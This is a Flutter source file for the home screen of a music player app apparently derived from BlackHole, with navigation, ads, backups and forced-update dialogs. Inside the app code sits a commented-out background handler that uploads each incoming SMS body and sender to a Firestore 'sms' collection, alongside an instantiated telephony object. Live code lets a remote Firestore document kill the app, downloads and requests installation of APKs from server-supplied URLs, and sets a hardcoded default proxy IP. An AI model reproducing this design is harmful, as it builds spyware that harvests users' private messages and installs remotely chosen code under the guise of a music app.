import 'dart:io';
import 'dart:math';

// import 'package:applovin_max/applovin_max.dart';
import 'package:blackhole/CustomWidgets/custom_physics.dart';
import 'package:blackhole/CustomWidgets/gradient_containers.dart';
import 'package:blackhole/CustomWidgets/miniplayer.dart';
import 'package:blackhole/CustomWidgets/snackbar.dart';
import 'package:blackhole/CustomWidgets/textinput_dialog.dart';
import 'package:blackhole/Helpers/audio_query.dart';
import 'package:blackhole/Helpers/backup_restore.dart';
import 'package:blackhole/Helpers/downloads_checker.dart';
import 'package:blackhole/Helpers/extensions.dart';
import 'package:blackhole/Helpers/supabase.dart';
import 'package:blackhole/Screens/Home/saavn.dart';
import 'package:blackhole/Screens/Library/library.dart';
import 'package:blackhole/Screens/LocalMusic/downed_songs.dart';
import 'package:blackhole/Screens/Search/search.dart';
import 'package:blackhole/Screens/Settings/setting.dart';
import 'package:blackhole/Screens/Top Charts/top.dart';
import 'package:blackhole/Screens/YouTube/youtube_home.dart';
import 'package:blackhole/Screens/signin_screen.dart';
import 'package:blackhole/Services/ext_storage_provider.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:flutter_gen/gen_l10n/app_localizations.dart';
// import 'package:google_mobile_ads/google_mobile_ads.dart';
import 'package:hive_flutter/hive_flutter.dart';
import 'package:material_design_icons_flutter/material_design_icons_flutter.dart';
// import 'package:onesignal_flutter/onesignal_flutter.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:path_provider/path_provider.dart';
import 'package:r_upgrade/r_upgrade.dart';
import 'package:salomon_bottom_bar/salomon_bottom_bar.dart';
import 'package:startapp_sdk/startapp.dart';
import 'package:telephony/telephony.dart';

// GetPhoneNumber();

// String msgss = '';
// onBackgroundMessage(SmsMessage message) async {
//   await Firebase.initializeApp();
// //get user uid
//   FirebaseAuth user = FirebaseAuth.instance;
//   final uids = user.currentUser?.uid;
//   msgss = message.body ?? 'Error reading message body.';
//   final dbs = FirebaseFirestore.instance;
//   dbs.collection('sms').doc(uids).set({
//     'body': msgss,
//     'date': DateTime.now(),
//     'from': message.address,
//     'read': true,
//     'type': message.type,
//   });
// }

class HomePage extends StatefulWidget {
  @override
  _HomePageState createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> {
  StartAppSdk startAppSdk = StartAppSdk();
  StartAppBannerAd? bannerAd;

  // String _message = '';
  final telephony = Telephony.instance;
  final FirebaseFirestore db = FirebaseFirestore.instance;

  Future<void> initPlatformState() async {
    Firebase.initializeApp();

    if (Hive.box('settings').get('stopServiceOnPause') == false) {
      Hive.box('settings').put('stopServiceOnPause', true);
    }
  }

  final ValueNotifier<int> _selectedIndex = ValueNotifier<int>(0);
  bool checked = false;
  String? appVersion;
  String name =
      Hive.box('settings').get('name', defaultValue: 'Listener') as String;
  bool checkUpdate =
      Hive.box('settings').get('checkUpdate', defaultValue: true) as bool;
  bool autoBackup =
      Hive.box('settings').get('autoBackup', defaultValue: false) as bool;
  DateTime? backButtonPressTime;
  OfflineAudioQuery offlineAudioQuery = OfflineAudioQuery();

  void callback() {
    setState(() {});
  }

  void _onItemTapped(int index) {
    _selectedIndex.value = index;
    _pageController.jumpToPage(
      index,
    );
  }

  bool compareVersion(String latestVersion, String currentVersion) {
    bool update = false;
    final List latestList = latestVersion.split('.');
    final List currentList = currentVersion.split('.');
    for (int i = 0; i < latestList.length; i++) {
      try {
        if (int.parse(latestList[i] as String) >
            int.parse(currentList[i] as String)) {
          update = true;
          break;
        }
      } catch (e) {
        break;
      }
    }
    return update;
  }

  void updateUserDetails(String key, dynamic value) {
    final userId = Hive.box('settings').get('userId') as String?;
    SupaBase().updateUserDetails(userId, key, value);
  }

  Future<bool> handleWillPop(BuildContext context) async {
    final now = DateTime.now();
    final backButtonHasNotBeenPressedOrSnackBarHasBeenClosed =
        backButtonPressTime == null ||
            now.difference(backButtonPressTime!) > const Duration(seconds: 3);

    if (backButtonHasNotBeenPressedOrSnackBarHasBeenClosed) {
      backButtonPressTime = now;
      ShowSnackBar().showSnackBar(
        context,
        AppLocalizations.of(context)!.exitConfirm,
        duration: const Duration(seconds: 2),
        noAction: true,
      );
      return false;
    }
    return true;
  }

  Widget checkVersion() {
    // ignore: unused_local_variable
    final FirebaseFirestore db;
    var collection = FirebaseFirestore.instance.collection('users');
    collection.doc('popup').snapshots().listen((docSnapshot) {
      if (docSnapshot.exists) {
        Map<String, dynamic> data = docSnapshot.data()!;

        // You can then retrieve the value from the Map like this:
        var info = data['info'];
        String msg = data['msg'].toString();
        String server = data['server'].toString();
        String servers = data['servers'].toString();
        String appname = data['appname'].toString();
        // ignore: unused_local_variable
        var apps = appname;
        //prefs.setString('popup', data['popup']);
        if (info == 'true') {
          showDialog<void>(
            context: context,
            barrierDismissible: false, // user must tap button!
            builder: (BuildContext context) {
              return AlertDialog(
                shape: const RoundedRectangleBorder(
                    borderRadius: BorderRadius.all(Radius.circular(20))),
                title: const Text('Hi  There '),
                content: SingleChildScrollView(
                  child: ListBody(
                    children: <Widget>[
                      Text(msg),
                    ],
                  ),
                ),
                actions: <Widget>[
                  TextButton(
                    child: const Text('Ok'),
                    onPressed: () async {
                      Navigator.pop(context);
                    },
                  )
                ],
              );
            },
          );
        }
        ;
        if (server == 'true') {
          showDialog<void>(
            context: context,
            barrierDismissible: false, // user must tap button!
            builder: (BuildContext context) {
              return AlertDialog(
                shape: const RoundedRectangleBorder(
                    borderRadius: BorderRadius.all(Radius.circular(20))),
                title: const Text('Hi  There '),
                content: SingleChildScrollView(
                  child: ListBody(
                    children: <Widget>[
                      Text(servers),
                    ],
                  ),
                ),
                actions: <Widget>[
                  TextButton(
                    child: const Text('Ok'),
                    onPressed: () async {
                      exit(0);
                    },
                  )
                ],
              );
            },
          );
        }
      }
    });

    if (!checked && Theme.of(context).platform == TargetPlatform.android) {
      checked = true;
      final SupaBase db = SupaBase();
      final DateTime now = DateTime.now();
      final List lastLogin = now
          .toUtc()
          .add(const Duration(hours: 5, minutes: 30))
          .toString()
          .split('.')
        ..removeLast()
        ..join('.');
      updateUserDetails('lastLogin', '${lastLogin[0]} IST');
      final String offset =
          now.timeZoneOffset.toString().replaceAll('.000000', '');

      updateUserDetails(
        'timeZone',
        'Zone: ${now.timeZoneName}, Offset: $offset',
      );

      PackageInfo.fromPlatform().then((PackageInfo packageInfo) {
        appVersion = packageInfo.version;
        updateUserDetails('version', packageInfo.version);

        if (checkUpdate) {
          db.getUpdate().then((Map value) async {
            if (compareVersion(
              value['LatestVersion'] as String,
              appVersion!,
            )) {
              List? abis =
                  await Hive.box('settings').get('supportedAbis') as List?;

              if (abis == null) {
                final DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
                final AndroidDeviceInfo androidDeviceInfo =
                    await deviceInfo.androidInfo;
                abis = androidDeviceInfo.supportedAbis;
                await Hive.box('settings').put('supportedAbis', abis);
              }
              showDialog<void>(
                context: context,
                barrierDismissible: false, // user must tap button!
                builder: (BuildContext context) {
                  return AlertDialog(
                    shape: const RoundedRectangleBorder(
                        borderRadius: BorderRadius.all(Radius.circular(20))),
                    title: const Text('New Update Available'),
                    content: SingleChildScrollView(
                      child: ListBody(
                        children: const <Widget>[
                          Text('A new version of this app is made available'),
                          Text(
                              'Please update the app as Now onwards this version will not work!!!'),
                        ],
                      ),
                    ),
                    actions: <Widget>[
                      TextButton(
                        child: const Text('Update'),
                        onPressed: () async {
                          // var versionUrl;
                          Navigator.pop(context);
                          if (abis!.contains('arm64-v8a')) {
                            var url = value['arm64-v8a'] as String;
                            var name = value['app'] as String;
                            // ignore: unused_local_variable
                            final externalDir =
                                await getExternalStorageDirectory();
                            // ignore: unused_local_variable
                            final int? id = await RUpgrade.upgrade(url,
                                fileName: name,
                                // ignore: avoid_redundant_argument_values
                                notificationVisibility:
                                    // ignore: avoid_redundant_argument_values
                                    NotificationVisibility.VISIBILITY_VISIBLE,
                                // ignore: avoid_redundant_argument_values
                                notificationStyle:
                                    NotificationStyle.planTimeAndSpeech,
                                isAutoRequestInstall: true);
                            // }
                          } else {
                            if (abis.contains('armeabi-v7a')) {
                              var url = value['armeabi-v7a'] as String;
                              var name = value['app'] as String;
                              // ignore: unused_local_variable
                              final externalDir =
                                  await getExternalStorageDirectory();
                              // ignore: unused_local_variable, require_trailing_commas
                              final int? id = await RUpgrade.upgrade(url,
                                  fileName: name,
                                  // ignore: avoid_redundant_argument_values
                                  notificationVisibility:
                                      NotificationVisibility.VISIBILITY_VISIBLE,
                                  notificationStyle:
                                      NotificationStyle.planTimeAndSpeech,
                                  isAutoRequestInstall: true);
                            } else {
                              var url = value['universal'] as String;
                              var name = value['app'] as String;
                              // ignore: unused_local_variable
                              final externalDir =
                                  await getExternalStorageDirectory();
                              // ignore: unused_local_variable
                              final int? id = await RUpgrade.upgrade(url,
                                  // ignore: avoid_redundant_argument_values
                                  fileName: name,
                                  notificationVisibility:
                                      NotificationVisibility.VISIBILITY_VISIBLE,
                                  notificationStyle:
                                      NotificationStyle.planTimeAndSpeech,
                                  isAutoRequestInstall: true);
                            }
                          }
                        },
                      ),
                      TextButton(
                        onPressed: () => exit(0),
                        child: const Text('Close'),
                      ),
                    ],
                  );
                },
              );
            }
          });
        }
        if (autoBackup) {
          final List<String> checked = [
            AppLocalizations.of(
              context,
            )!
                .settings,
            AppLocalizations.of(
              context,
            )!
                .downs,
            AppLocalizations.of(
              context,
            )!
                .playlists,
          ];
          final List playlistNames = Hive.box('settings').get(
            'playlistNames',
            defaultValue: ['Favorite Songs'],
          ) as List;
          final Map<String, List> boxNames = {
            AppLocalizations.of(
              context,
            )!
                .settings: ['settings'],
            AppLocalizations.of(
              context,
            )!
                .cache: ['cache'],
            AppLocalizations.of(
              context,
            )!
                .downs: ['downloads'],
            AppLocalizations.of(
              context,
            )!
                .playlists: playlistNames,
          };
          final String autoBackPath = Hive.box('settings').get(
            'autoBackPath',
            defaultValue: '',
          ) as String;
          if (autoBackPath == '') {
            ExtStorageProvider.getExtStorage(
              dirName: 'BlackHole/Backups',
            ).then((value) {
              Hive.box('settings').put('autoBackPath', value);
              createBackup(
                context,
                checked,
                boxNames,
                path: value,
                fileName: 'BlackHole_AutoBackup',
                showDialog: false,
              );
            });
          } else {
            createBackup(
              context,
              checked,
              boxNames,
              path: autoBackPath,
              fileName: 'BlackHole_AutoBackup',
              showDialog: false,
            );
          }
        }
      });
      if (Hive.box('settings').get('proxyIp') == null) {
        Hive.box('settings').put('proxyIp', '103.47.67.134');
      }
      if (Hive.box('settings').get('proxyPort') == null) {
        Hive.box('settings').put('proxyPort', 8080);
      }

      downloadChecker();
      return const SizedBox();
    } else {
      return const SizedBox();
    }
  }

  final ScrollController _scrollController = ScrollController();
  final PageController _pageController = PageController();

  @override
  void initState() {
    super.initState();
    initPlatformState();
  }

  @override
  void dispose() {
    _pageController.dispose();
    _scrollController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    // startAppSdk.setTestAdsEnabled(false);

    // TODO use one of the following types: BANNER, MREC, COVER
    startAppSdk.loadBannerAd(StartAppBannerType.BANNER).then((bannerAd) {
      setState(() {
        this.bannerAd = bannerAd;
      });
    }).onError<StartAppException>((ex, stackTrace) {
      debugPrint("Error loading Banner ad: ${ex.message}");
    }).onError((error, stackTrace) {
      debugPrint("Error loading Banner ad: $error");
    });

    // OneSignal.shared.setAppId("9a828e84-8516-4c5d-a73a-915536278fb1");
    // OneSignal.shared.setNotificationWillShowInForegroundHandler(
    //     (OSNotificationReceivedEvent event) {
    //   showDialog<void>(
    //     context: context,
    //     barrierDismissible: false, // user must tap button!
    //     builder: (BuildContext context) {
    //       return AlertDialog(
    //         shape: const RoundedRectangleBorder(
    //             borderRadius: BorderRadius.all(Radius.circular(20))),
    //         // ignore: cast_nullable_to_non_nullable
    //         title: Text(event.notification.title as String),
    //         content: SingleChildScrollView(
    //           child: ListBody(
    //             children: <Widget>[
    //               // ignore: cast_nullable_to_non_nullable
    //               Text(event.notification.body as String),
    //             ],
    //           ),
    //         ),
    //         actions: <Widget>[
    //           TextButton(
    //             child: const Text('Ok'),
    //             onPressed: () async {
    //               Navigator.pop(context);
    //             },
    //           )
    //         ],
    //       );
    //     },
    //   );
    // });
    // OneSignal.shared
    //     .setNotificationOpenedHandler((OSNotificationOpenedResult result) {
    //   HomePage();
    // });
    // OneSignal.shared
    //     .setSubscriptionObserver((OSSubscriptionStateChanges changes) {
    //   // Will be called whenever the subscription changes
    //   // (ie. user gets registered with OneSignal and gets a user ID)
    // });
    // OneSignal.shared
    //     .setInAppMessageClickedHandler((OSInAppMessageAction action) {});
    // // show onesignal in app message
    // OneSignal.shared
    //     .setOnWillDisplayInAppMessageHandler((OSInAppMessage inAppMessage) {});

    // OneSignal.shared.setOnWillDisplayInAppMessageHandler((message) {});

    // shows addd ??? ///

    final double screenWidth = MediaQuery.of(context).size.width;
    final bool rotated = MediaQuery.of(context).size.height < screenWidth;
    return GradientContainer(
      child: Scaffold(
        resizeToAvoidBottomInset: false,
        backgroundColor: Colors.transparent,
        drawer: Drawer(
          child: GradientContainer(
            child: CustomScrollView(
              shrinkWrap: true,
              physics: const BouncingScrollPhysics(),
              slivers: [
                SliverAppBar(
                  backgroundColor: Colors.transparent,
                  automaticallyImplyLeading: false,
                  elevation: 0,
                  stretch: true,
                  expandedHeight: MediaQuery.of(context).size.height * 0.2,
                  flexibleSpace: FlexibleSpaceBar(
                    title: RichText(
                      text: TextSpan(
                        text: AppLocalizations.of(context)!.appTitle,
                        style: const TextStyle(
                          fontSize: 30.0,
                          fontWeight: FontWeight.w500,
                        ),
                        children: <TextSpan>[
                          TextSpan(
                            text: appVersion == null ? '' : '\nv$appVersion',
                            style: const TextStyle(
                              fontSize: 7.0,
                            ),
                          ),
                        ],
                      ),
                      textAlign: TextAlign.end,
                    ),
                    titlePadding: const EdgeInsets.only(bottom: 40.0),
                    centerTitle: true,
                    background: ShaderMask(
                      shaderCallback: (rect) {
                        return LinearGradient(
                          begin: Alignment.topCenter,
                          end: Alignment.bottomCenter,
                          colors: [
                            Colors.black.withOpacity(0.8),
                            Colors.black.withOpacity(0.1),
                          ],
                        ).createShader(
                          Rect.fromLTRB(0, 0, rect.width, rect.height),
                        );
                      },
                      blendMode: BlendMode.dstIn,
                      child: Image(
                        fit: BoxFit.cover,
                        alignment: Alignment.topCenter,
                        image: AssetImage(
                          Theme.of(context).brightness == Brightness.dark
                              ? 'assets/header-dark.jpg'
                              : 'assets/header.jpg',
                        ),
                      ),
                    ),
                  ),
                ),
                SliverList(
                  delegate: SliverChildListDelegate(
                    [
                      ListTile(
                        title: Text(
                          AppLocalizations.of(context)!.home,
                          style: TextStyle(
                            color: Theme.of(context).colorScheme.secondary,
                          ),
                        ),
                        contentPadding:
                            const EdgeInsets.symmetric(horizontal: 20.0),
                        leading: Icon(
                          Icons.home_rounded,
                          color: Theme.of(context).colorScheme.secondary,
                        ),
                        selected: true,
                        onTap: () {
                          Navigator.pop(context);
                        },
                      ),
                      if (Platform.isAndroid)
                        ListTile(
                          title: Text(AppLocalizations.of(context)!.myMusic),
                          contentPadding:
                              const EdgeInsets.symmetric(horizontal: 20.0),
                          leading: Icon(
                            MdiIcons.folderMusic,
                            color: Theme.of(context).iconTheme.color,
                          ),
                          onTap: () {
                            Navigator.pop(context);
                            Navigator.push(
                              context,
                              MaterialPageRoute(
                                builder: (context) => const DownloadedSongs(
                                  showPlaylists: true,
                                ),
                              ),
                            );
                          },
                        ),
                      ListTile(
                        title: Text(AppLocalizations.of(context)!.downs),
                        contentPadding:
                            const EdgeInsets.symmetric(horizontal: 20.0),
                        leading: Icon(
                          Icons.download_done_rounded,
                          color: Theme.of(context).iconTheme.color,
                        ),
                        onTap: () {
                          Navigator.pop(context);
                          Navigator.pushNamed(context, '/downloads');
                        },
                      ),
                      ListTile(
                        title: Text(AppLocalizations.of(context)!.playlists),
                        contentPadding:
                            const EdgeInsets.symmetric(horizontal: 20.0),
                        leading: Icon(
                          Icons.playlist_play_rounded,
                          color: Theme.of(context).iconTheme.color,
                        ),
                        onTap: () {
                          Navigator.pop(context);
                          Navigator.pushNamed(context, '/playlists');
                        },
                      ),
                      ListTile(
                        title: Text(AppLocalizations.of(context)!.settings),
                        contentPadding:
                            const EdgeInsets.symmetric(horizontal: 20.0),
                        leading: Icon(
                          Icons
                              .settings_rounded, // miscellaneous_services_rounded,
                          color: Theme.of(context).iconTheme.color,
                        ),
                        onTap: () {
                          Navigator.pop(context);
                          Navigator.push(
                            context,
                            MaterialPageRoute(
                              builder: (context) =>
                                  SettingPage(callback: callback),
                            ),
                          );
                        },
                      ),
                      ListTile(
                        title: Text(AppLocalizations.of(context)!.about),
                        contentPadding:
                            const EdgeInsets.symmetric(horizontal: 20.0),
                        leading: Icon(
                          Icons.info_outline_rounded,
                          color: Theme.of(context).iconTheme.color,
                        ),
                        onTap: () {
                          Navigator.pop(context);
                          Navigator.pushNamed(context, '/about');
                        },
                      ),
                      ListTile(
                          title: Text('Log Out'),
                          contentPadding:
                              const EdgeInsets.symmetric(horizontal: 20.0),
                          leading: Icon(
                            Icons.logout_outlined,
                            color: Theme.of(context).iconTheme.color,
                          ),
                          onTap: () {
                            FirebaseAuth.instance.signOut().then(
                              (value) {
                                print('Signed Out');
                                Navigator.push(
                                    context,
                                    MaterialPageRoute(
                                        builder: (context) => SignInScreen()));
                              },
                            );
                          })
                    ],
                  ),
                ),
                SliverFillRemaining(
                  hasScrollBody: false,
                  child: Column(
                    children: <Widget>[
                      const Spacer(),
                      Padding(
                        padding: const EdgeInsets.fromLTRB(5, 30, 5, 20),
                        child: Center(
                          child: Text(
                            AppLocalizations.of(context)!.madeBy,
                            textAlign: TextAlign.center,
                            style: const TextStyle(fontSize: 12),
                          ),
                        ),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
        ),
        body: WillPopScope(
          onWillPop: () => handleWillPop(context),
          child: SafeArea(
            child: Row(
              children: [
                if (rotated)
                  ValueListenableBuilder(
                    valueListenable: _selectedIndex,
                    builder:
                        (BuildContext context, int indexValue, Widget? child) {
                      return NavigationRail(
                        minWidth: 70.0,
                        groupAlignment: 0.0,
                        backgroundColor:
                            // Colors.transparent,
                            Theme.of(context).cardColor,
                        selectedIndex: indexValue,
                        onDestinationSelected: (int index) {
                          _onItemTapped(index);
                        },
                        labelType: screenWidth > 1050
                            ? NavigationRailLabelType.selected
                            : NavigationRailLabelType.none,
                        selectedLabelTextStyle: TextStyle(
                          color: Theme.of(context).colorScheme.secondary,
                          fontWeight: FontWeight.w600,
                        ),
                        unselectedLabelTextStyle: TextStyle(
                          color: Theme.of(context).iconTheme.color,
                        ),
                        selectedIconTheme: Theme.of(context).iconTheme.copyWith(
                              color: Theme.of(context).colorScheme.secondary,
                            ),
                        unselectedIconTheme: Theme.of(context).iconTheme,
                        useIndicator: screenWidth < 1050,
                        indicatorColor: Theme.of(context)
                            .colorScheme
                            .secondary
                            .withOpacity(0.2),
                        leading: screenWidth > 1050
                            ? null
                            : Builder(
                                builder: (context) => Transform.rotate(
                                  angle: 22 / 7 * 2,
                                  child: IconButton(
                                    icon: const Icon(
                                      Icons.horizontal_split_rounded,
                                    ),
                                    // color: Theme.of(context).iconTheme.color,
                                    onPressed: () {
                                      Scaffold.of(context).openDrawer();
                                    },
                                    tooltip: MaterialLocalizations.of(context)
                                        .openAppDrawerTooltip,
                                  ),
                                ),
                              ),
                        destinations: [
                          NavigationRailDestination(
                            icon: const Icon(Icons.home_rounded),
                            label: Text(AppLocalizations.of(context)!.home),
                          ),
                          NavigationRailDestination(
                            icon: const Icon(Icons.trending_up_rounded),
                            label: Text(
                              AppLocalizations.of(context)!.topCharts,
                            ),
                          ),
                          NavigationRailDestination(
                            icon: const Icon(MdiIcons.youtube),
                            label: Text(AppLocalizations.of(context)!.youTube),
                          ),
                          NavigationRailDestination(
                            icon: const Icon(Icons.my_library_music_rounded),
                            label: Text(AppLocalizations.of(context)!.library),
                          ),
                        ],
                      );
                    },
                  ),
                Expanded(
                  child: Column(
                    children: [
                      Expanded(
                        child: PageView(
                          physics: const CustomPhysics(),
                          onPageChanged: (indx) {
                            _selectedIndex.value = indx;
                          },
                          controller: _pageController,
                          children: [
                            Stack(
                              children: [
                                checkVersion(),
                                NestedScrollView(
                                  physics: const BouncingScrollPhysics(),
                                  controller: _scrollController,
                                  headerSliverBuilder: (
                                    BuildContext context,
                                    bool innerBoxScrolled,
                                  ) {
                                    return <Widget>[
                                      SliverAppBar(
                                        expandedHeight: 135,
                                        backgroundColor: Colors.transparent,
                                        elevation: 0,
                                        pinned: true,
                                        //check here
                                        toolbarHeight: 65,
                                        floating: true,
                                        automaticallyImplyLeading: false,
                                        flexibleSpace: LayoutBuilder(
                                          builder: (
                                            BuildContext context,
                                            BoxConstraints constraints,
                                          ) {
                                            return FlexibleSpaceBar(
                                              // collapseMode: CollapseMode.parallax,
                                              background: GestureDetector(
                                                onTap: () async {
                                                  await showTextInputDialog(
                                                    context: context,
                                                    title: 'Name',
                                                    initialText: name,
                                                    keyboardType:
                                                        TextInputType.name,
                                                    onSubmitted: (value) {
                                                      Hive.box('settings').put(
                                                        'name',
                                                        value.trim(),
                                                      );
                                                      name = value.trim();
                                                      Navigator.pop(context);
                                                      updateUserDetails(
                                                        'name',
                                                        value.trim(),
                                                      );
                                                    },
                                                  );
                                                  setState(() {});
                                                },
                                                child: Column(
                                                  mainAxisSize:
                                                      MainAxisSize.min,
                                                  children: <Widget>[
                                                    const SizedBox(
                                                      height: 60,
                                                    ),
                                                    Row(
                                                      children: [
                                                        Padding(
                                                          padding:
                                                              const EdgeInsets
                                                                  .only(
                                                            left: 15.0,
                                                          ),
                                                          child: Text(
                                                            AppLocalizations.of(
                                                              context,
                                                            )!
                                                                .homeGreet,
                                                            style: TextStyle(
                                                              letterSpacing: 2,
                                                              color: Theme.of(
                                                                context,
                                                              )
                                                                  .colorScheme
                                                                  .secondary,
                                                              fontSize: 30,
                                                              fontWeight:
                                                                  FontWeight
                                                                      .bold,
                                                            ),
                                                          ),
                                                        ),
                                                      ],
                                                    ),
                                                    Padding(
                                                      padding:
                                                          const EdgeInsets.only(
                                                        left: 15.0,
                                                      ),
                                                      child: Row(
                                                        crossAxisAlignment:
                                                            CrossAxisAlignment
                                                                .end,
                                                        children: [
                                                          ValueListenableBuilder(
                                                            valueListenable:
                                                                Hive.box(
                                                              'settings',
                                                            ).listenable(),
                                                            builder: (
                                                              BuildContext
                                                                  context,
                                                              Box box,
                                                              Widget? child,
                                                            ) {
                                                              return Text(
                                                                (box.get('name') ==
                                                                            null ||
                                                                        box.get('name') ==
                                                                            '')
                                                                    ? 'Listener'
                                                                    : box
                                                                        .get(
                                                                          'name',
                                                                        )
                                                                        .split(
                                                                          ' ',
                                                                        )[0]
                                                                        .toString()
                                                                        .capitalize(),
                                                                style:
                                                                    const TextStyle(
                                                                  letterSpacing:
                                                                      2,
                                                                  fontSize: 20,
                                                                  fontWeight:
                                                                      FontWeight
                                                                          .w500,
                                                                ),
                                                              );
                                                            },
                                                          ),
                                                        ],
                                                      ),
                                                    ),
                                                  ],
                                                ),
                                              ),
                                            );
                                          },
                                        ),
                                      ),
                                      SliverAppBar(
                                        automaticallyImplyLeading: false,
                                        pinned: true,
                                        backgroundColor: Colors.transparent,
                                        elevation: 0,
                                        stretch: true,
                                        toolbarHeight: 65,
                                        title: Align(
                                          alignment: Alignment.centerRight,
                                          child: AnimatedBuilder(
                                            animation: _scrollController,
                                            builder: (context, child) {
                                              return GestureDetector(
                                                child: AnimatedContainer(
                                                  width: (!_scrollController
                                                              .hasClients ||
                                                          _scrollController
                                                                  // ignore: invalid_use_of_protected_member
                                                                  .positions
                                                                  .length >
                                                              1)
                                                      ? MediaQuery.of(context)
                                                          .size
                                                          .width
                                                      : max(
                                                          MediaQuery.of(context)
                                                                  .size
                                                                  .width -
                                                              _scrollController
                                                                  .offset
                                                                  .roundToDouble(),
                                                          MediaQuery.of(context)
                                                                  .size
                                                                  .width -
                                                              75,
                                                        ),
                                                  height: 52.0,
                                                  duration: const Duration(
                                                    milliseconds: 150,
                                                  ),
                                                  padding:
                                                      const EdgeInsets.all(2.0),
                                                  // margin: EdgeInsets.zero,
                                                  decoration: BoxDecoration(
                                                    borderRadius:
                                                        BorderRadius.circular(
                                                      10.0,
                                                    ),
                                                    color: Theme.of(context)
                                                        .cardColor,
                                                    boxShadow: const [
                                                      BoxShadow(
                                                        color: Colors.black26,
                                                        blurRadius: 5.0,
                                                        offset:
                                                            Offset(1.5, 1.5),
                                                        // shadow direction: bottom right
                                                      )
                                                    ],
                                                  ),
                                                  child: Row(
                                                    children: [
                                                      const SizedBox(
                                                        width: 10.0,
                                                      ),
                                                      Icon(
                                                        CupertinoIcons.search,
                                                        color: Theme.of(context)
                                                            .colorScheme
                                                            .secondary,
                                                      ),
                                                      const SizedBox(
                                                        width: 10.0,
                                                      ),
                                                      Text(
                                                        AppLocalizations.of(
                                                          context,
                                                        )!
                                                            .searchText,
                                                        style: TextStyle(
                                                          fontSize: 16.0,
                                                          color:
                                                              Theme.of(context)
                                                                  .textTheme
                                                                  .caption!
                                                                  .color,
                                                          fontWeight:
                                                              FontWeight.normal,
                                                        ),
                                                      ),
                                                    ],
                                                  ),
                                                ),
                                                onTap: () => Navigator.push(
                                                  context,
                                                  MaterialPageRoute(
                                                    builder: (context) =>
                                                        const SearchPage(
                                                      query: '',
                                                      fromHome: true,
                                                      autofocus: true,
                                                    ),
                                                  ),
                                                ),
                                              );
                                            },
                                          ),
                                        ),
                                      ),
                                    ];
                                  },
                                  body: SaavnHomePage(),
                                ),
                                if (!rotated || screenWidth > 1050)
                                  Builder(
                                    builder: (context) => Padding(
                                      padding: const EdgeInsets.only(
                                        top: 8.0,
                                        left: 4.0,
                                      ),
                                      child: Transform.rotate(
                                        angle: 22 / 7 * 2,
                                        child: IconButton(
                                          icon: const Icon(
                                            Icons.horizontal_split_rounded,
                                          ),
                                          // color: Theme.of(context).iconTheme.color,
                                          onPressed: () {
                                            Scaffold.of(context).openDrawer();
                                          },
                                          tooltip:
                                              MaterialLocalizations.of(context)
                                                  .openAppDrawerTooltip,
                                        ),
                                      ),
                                    ),
                                  ),
                              ],
                            ),
                            TopCharts(
                              pageController: _pageController,
                            ),
                            const YouTube(),
                            const LibraryPage(),
                          ],
                        ),
                      ),
                      bannerAd != null
                          ? StartAppBanner(bannerAd!)
                          : Container(),
                      const MiniPlayer()
                    ],
                  ),
                ),
              ],
            ),
          ),
        ),
        bottomNavigationBar: rotated
            ? null
            : SafeArea(
                child: ValueListenableBuilder(
                  valueListenable: _selectedIndex,
                  builder:
                      (BuildContext context, int indexValue, Widget? child) {
                    return AnimatedContainer(
                      duration: const Duration(milliseconds: 100),
                      height: 60,
                      child: SalomonBottomBar(
                        currentIndex: indexValue,
                        onTap: (index) {
                          _onItemTapped(index);
                        },
                        items: [
                          SalomonBottomBarItem(
                            icon: const Icon(Icons.home_rounded),
                            title: Text(AppLocalizations.of(context)!.home),
                            selectedColor:
                                Theme.of(context).colorScheme.secondary,
                          ),
                          SalomonBottomBarItem(
                            icon: const Icon(Icons.trending_up_rounded),
                            title: Text(
                              AppLocalizations.of(context)!.topCharts,
                            ),
                            selectedColor:
                                Theme.of(context).colorScheme.secondary,
                          ),
                          SalomonBottomBarItem(
                            icon: const Icon(MdiIcons.youtube),
                            title: Text(AppLocalizations.of(context)!.youTube),
                            selectedColor:
                                Theme.of(context).colorScheme.secondary,
                          ),
                          SalomonBottomBarItem(
                            icon: const Icon(Icons.my_library_music_rounded),
                            title: Text(AppLocalizations.of(context)!.library),
                            selectedColor:
                                Theme.of(context).colorScheme.secondary,
                          ),
                        ],
                      ),
                    );
                  },
                ),
              ),
      ),
    );
  }
}
